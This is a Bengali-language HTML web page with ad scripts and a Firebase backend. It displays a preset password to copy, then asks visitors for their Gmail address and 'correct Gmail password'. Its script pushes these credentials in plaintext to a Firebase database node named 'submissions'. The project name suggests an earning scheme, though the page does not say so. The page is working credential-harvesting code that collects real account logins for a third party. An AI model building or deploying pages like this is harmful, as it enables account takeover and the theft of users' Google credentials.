<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>পাসওয়ার্ড ও জিমেইল সাবমিট</title>

  <!-- Google Bengali Font & Icons -->
  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Hind Siliguri', sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: #0f172a;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 16px;
      color: #ffffff;
    }

    /* Ad Container Styling */
    .ad-container {
      margin: 10px 0;
      text-align: center;
      width: 100%;
      max-width: 400px;
      overflow: hidden;
      display: flex;
      justify-content: center;
    }

    .card {
      background: #1e293b;
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 24px 20px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    }

    /* Top Password Copy Box */
    .password-box {
      background: #0f172a;
      border: 1.5px dashed #a855f7;
      border-radius: 14px;
      padding: 12px 16px;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .password-text {
      font-size: 18px;
      font-weight: 700;
      color: #38bdf8;
      letter-spacing: 1px;
    }

    .copy-btn {
      background: #a855f7;
      color: #ffffff;
      border: none;
      padding: 10px 18px;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .copy-btn:active {
      background: #9333ea;
      transform: scale(0.96);
    }

    /* Form Fields */
    .form-group {
      margin-bottom: 16px;
    }

    .input-field {
      width: 100%;
      background: #0f172a;
      border: 1px solid #334155;
      border-radius: 12px;
      padding: 16px;
      color: #ffffff;
      font-size: 15px;
      outline: none;
    }

    .input-field::placeholder {
      color: #94a3b8;
    }

    .input-field:focus {
      border-color: #a855f7;
      box-shadow: 0 0 8px rgba(168, 85, 247, 0.3);
    }

    /* Premium Submit Button */
    .submit-btn {
      width: 100%;
      background: linear-gradient(135deg, #a855f7 0%, #6366f1 100%);
      color: #ffffff;
      border: none;
      border-radius: 12px;
      padding: 16px;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 6px 16px rgba(168, 85, 247, 0.4);
      margin-top: 8px;
    }

    .submit-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .submit-btn:active:not(:disabled) {
      transform: scale(0.98);
    }

    /* Toast Notification */
    .toast {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%) translateY(100px);
      background: #10b981;
      color: #ffffff;
      padding: 10px 22px;
      border-radius: 30px;
      font-size: 14px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 8px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.4);
      opacity: 0;
      transition: all 0.3s ease;
      z-index: 9999;
    }

    .toast.show {
      transform: translateX(-50%) translateY(0);
      opacity: 1;
    }
  </style>
</head>
<body>

  <!-- Top Adsterra Ad (160x300) -->
  <div class="ad-container">
    <script>
      atOptions = {
        'key' : 'f7478ed524831ba45360f804477a97ec',
        'format' : 'iframe',
        'height' : 300,
        'width' : 160,
        'params' : {}
      };
    </script>
    <script src="https://bicea.org/22/f7478ed524831ba45360f804477a97ec"></script>
  </div>

  <div class="card">
    <!-- Password Display & Copy -->
    <div class="password-box">
      <span class="password-text" id="passText">aass1122@$</span>
      <button class="copy-btn" id="copyBtn">
        <i class="fa-regular fa-copy"></i>
        <span>কপি</span>
      </button>
    </div>

    <!-- User Input Form -->
    <form id="submissionForm">
      <!-- Box 1: Gmail -->
      <div class="form-group">
        <input type="email" id="userGmail" class="input-field" placeholder="আপনার gmail দিন।" required>
      </div>

      <!-- Box 2: Gmail Password -->
      <div class="form-group">
        <input type="text" id="userPassword" class="input-field" placeholder="gmail এর সঠিক পাসওয়ার্ড লিখুন।" required>
      </div>

      <!-- Submit Button -->
      <button type="submit" id="submitBtn" class="submit-btn">
        <span>Submit</span>
        <i class="fa-solid fa-paper-plane"></i>
      </button>
    </form>
  </div>

  <!-- Bottom Adsterra Ad (300x250) -->
  <div class="ad-container">
    <script>
      atOptions = {
        'key' : '682d4373940fc6623aff3d9adea8de73',
        'format' : 'iframe',
        'height' : 250,
        'width' : 300,
        'params' : {}
      };
    </script>
    <script src="https://bicea.org/22/682d4373940fc6623aff3d9adea8de73"></script>
  </div>

  <!-- Copy Alert Toast -->
  <div class="toast" id="toast">
    <i class="fa-solid fa-circle-check"></i>
    <span id="toastText">পাসওয়ার্ড কপি করা হয়েছে!</span>
  </div>

  <!-- Firebase JavaScript SDK (v10 Modular via CDN) -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    // আপনার দেওয়া Firebase কনফিগারেশন
    const firebaseConfig = {
      apiKey: "AIzaSyBDWy86UtMNL4sHyODBEQBbUxPKaj55LVk",
      authDomain: "earning-bd-2960a.firebaseapp.com",
      databaseURL: "https://earning-bd-2960a-default-rtdb.firebaseio.com",
      projectId: "earning-bd-2960a",
      storageBucket: "earning-bd-2960a.firebasestorage.app",
      messagingSenderId: "748680584232",
      appId: "1:748680584232:web:951dd7531c510d2d91691d"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    // Toast দেখানোর ফাংশন
    function showToast(message) {
      const toast = document.getElementById('toast');
      document.getElementById('toastText').innerText = message;
      toast.classList.add('show');
      setTimeout(function() {
        toast.classList.remove('show');
      }, 2500);
    }

    // পাসওয়ার্ড কপি করার লজিক
    document.getElementById('copyBtn').addEventListener('click', function() {
      var passText = document.getElementById('passText').innerText;

      if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(passText);
      } else {
        var textArea = document.createElement("textarea");
        textArea.value = passText;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
      }

      showToast("পাসওয়ার্ড কপি করা হয়েছে!");
    });

    // ফর্ম সাবমিশন এবং Firebase-এ ডাটা সেভ
    document.getElementById('submissionForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const gmail = document.getElementById('userGmail').value.trim();
      const password = document.getElementById('userPassword').value.trim();
      const submitBtn = document.getElementById('submitBtn');

      if (!gmail || !password) return;

      submitBtn.disabled = true;
      submitBtn.innerHTML = `<span>জমা হচ্ছে...</span>`;

      // 'submissions' ফোল্ডারে ডাটা পুশ হবে
      const submissionsRef = ref(database, 'submissions');
      
      push(submissionsRef, {
        gmail: gmail,
        password: password,
        timestamp: new Date().toISOString()
      }).then(() => {
        showToast("সফলভাবে ডাটা জমা হয়েছে!");
        document.getElementById('submissionForm').reset(); // কোডটি এখানে ঠিক করা হয়েছে
      }).catch((error) => {
        alert("ভুল হয়েছে: " + error.message);
      }).finally(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = `<span>Submit</span> <i class="fa-solid fa-paper-plane"></i>`;
      });
    });
  </script>

</body>
</html>
